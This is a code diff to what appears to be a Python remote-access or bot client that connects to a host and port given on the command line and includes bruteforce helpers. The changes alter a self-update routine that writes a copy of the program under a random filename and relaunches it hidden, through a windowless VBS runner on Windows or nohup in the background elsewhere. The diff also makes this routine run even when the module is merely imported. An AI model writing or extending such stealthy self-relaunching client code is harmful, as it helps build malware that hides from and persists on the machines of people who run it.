@@ -33,6 +33,7 @@ import fnmatch
 import tempfile
 import socket
 import re
+import multiprocessing
 
 if len(sys.argv) == 3:
     host = sys.argv[1]
@@ -72,17 +73,20 @@ def repeat(obj, times=None):
 # Bruteforce Helper funcs END
 
 def selfUpdate():
-    filename = "%d.py" % random.randint(1, 1000)
+    filename = str(random.randint(1, 1000))
 
-    with open(filename, "w") as f:
+    with open(filename+'.py', "w") as f:
         f.write(temporary)
 
     if sys.platform == "win32":
         runner = 'CreateObject("WScript.Shell").Run WScript.Arguments(0), 0'
         with open(tempfile.gettempdir() + "/runner.vbs", "w") as f:
             f.write(runner)
-        os.system(tempfile.gettempdir() + '/runner.vbs "{exe} {arg} {host} {port}"'
-                  .format(host=host, port=port, exe=sys.executable, arg=sys.argv[0]))
+        if frozen:
+            multiprocessing.Process(target=__import__, args=(filename,))
+        else:
+            os.system(tempfile.gettempdir() + '/runner.vbs "{exe} {arg} {host} {port}"'
+                  .format(host=host, port=port, exe=sys.executable, arg=filename+'.py'))
     else:
         os.system("nohup {exe} {arg} {host} {port} > /dev/null 2>&1 &"
                   .format(host=host, port=port, exe=sys.executable, arg=sys.argv[0]))
@@ -448,8 +452,8 @@ def main(host, port):
                       "\n", __import__('traceback').print_exc())
                 break
 
+selfUpdate()
 if __name__ == '__main__':
-    selfUpdate()
     while True:
         try:
             main(host, port)
